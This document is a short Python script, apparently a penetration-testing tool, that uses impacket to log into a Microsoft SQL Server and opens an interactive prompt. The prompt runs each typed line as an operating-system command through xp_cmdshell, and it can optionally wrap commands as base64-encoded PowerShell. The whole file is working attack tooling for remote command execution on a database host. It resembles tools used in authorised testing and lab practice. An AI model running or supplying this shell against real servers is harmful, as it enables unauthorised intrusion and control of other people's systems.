# /usr/bin/env python3
# interactive xp_cmdshell
# with impacket and cmd
# used https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py for reference
import os, cmd, sys, re, base64
from impacket import tds
import readline


username = ''                                                                
password = ''
domain = '' # optional
ip = '127.0.0.1'                                                            
port = 1433
pwsh = False


if __name__ == '__main__':
    class XpShell(cmd.Cmd):
        def __init__(self, SQLObj):
            cmd.Cmd.__init__(self)
            self.sql = SQLObj
            self.prompt = 'xp_cmd> '
            self.file = None

        # interpret every line as system command
        def default(self, arg):
            try:
                if pwsh: 
                    new_arg = 'powershell -encodedCommand {}'
                    arg = new_arg.format(powershell_encode(arg))

                self.sql.sql_query("exec master..xp_cmdshell '{}'".format(arg))
                self.sql.printReplies()
                self.sql.colMeta[0]['TypeData'] = 80*2
                self.sql.printRows()
            except Exception as e:
                print(str(e))
                pass

        # i wont say what it does
        def do_exit(self, arg):
            exit()

        def do_pwsh(self, arg):
            global pwsh
            pwsh = False if pwsh else True
            print('powershell : {}'.format(pwsh))


        # ? yes
        def do_help(self, arg):
            print("""
    you found the help command

    pwsh    -   Toggle powershell on/off
    exit    -   i wont say what it does
                  """)


    # pass commands directly into powershell
    # ./xp_cmdshell.py -powershell
    if len(sys.argv) > 1 and sys.argv[1] == '-powershell':
        pwsh = True

        
    # reference https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
    def powershell_encode(data):
        powershell_command = ""

        # loop through each character and insert null byte
        for char in data: powershell_command += char + "\x00"
        return base64.b64encode(powershell_command.encode()).decode("utf-8")


    # do database connection (simple for now)
    try:
        ms_sql = tds.MSSQL(ip, port)
        ms_sql.connect()
        res = ms_sql.login(database = None, username = username, password = password, domain = domain)
        ms_sql.printReplies()

        # if connection successful
        if res is True:
            shell = XpShell(ms_sql)
            shell.cmdloop()
    except Exception as e:                                                         
        print('Exception: ')
        print(str(e))

    # close ms_sql 
    ms_sql.disconnect()
